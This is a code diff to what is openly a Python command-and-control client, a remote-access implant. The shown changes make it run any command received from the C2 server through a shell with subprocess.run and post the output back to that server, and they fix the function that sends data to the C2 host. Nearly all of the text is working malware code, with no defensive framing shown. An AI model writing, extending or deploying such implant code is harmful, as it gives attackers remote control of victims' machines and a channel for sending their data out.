@@ -34,8 +34,8 @@ def post_to_server(message, response_path=RESPONSE_PATH):
     """function to post data to C2 Server, accept message and response path
 	optional as arguments"""
     try:
-        post(f"http://{C2_SERVER}:{PORT}{RESPONSE_PATH}",
-             data={RESPONSE_KEY:commandOutput.stdout},
+        post(f"http://{C2_SERVER}:{PORT}{response_path}",
+             data={RESPONSE_KEY:message},
              headers=HEADERS, proxies=PROXY)
     except exceptions.RequestException:
         return
@@ -86,17 +86,12 @@ while True: #while True:
         except OSError:
             post_to_server("There was a Operation System Error on client.\n")
 
-    # if the Command is cd without any input path, change to home directory
-    # if command == "cd":
-    #     system("cd")
+    else:
+        # Run command using subprocess.run module
+        commandOutput = run(command, shell=True, stdout=PIPE, stderr=STDOUT)
+        post_to_server(commandOutput.stdout)
 
-    # Run command using subprocess.run module
-    commandOutput = run(command, shell=True, stdout=PIPE, stderr=STDOUT)
-    
-    post_to_server(commandOutput.stdout)
     print("[+] Command Executed and Result send to C2 Server.")
-    
-
     print(Fore.LIGHTBLUE_EX+str(response.status_code)+Fore.RESET)
     
 
